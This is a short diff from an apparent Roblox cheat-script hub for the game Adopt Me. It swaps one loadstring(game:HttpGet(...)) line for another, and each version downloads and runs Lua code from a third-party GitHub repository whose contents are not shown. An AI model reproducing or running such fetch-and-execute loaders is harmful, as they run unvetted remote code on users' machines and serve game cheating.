@@ -5,7 +5,7 @@ local Window = OrionLib:MakeWindow({Name = "KUJI HUB | Adopt Me", HidePremium = 
 
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SScripterr/Adoptme-KUJI/main/KUJIHUB"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/WAZTGSY-adopt-me.lua"))() 
 
 --[[
 Name = <string> - The name of the UI.
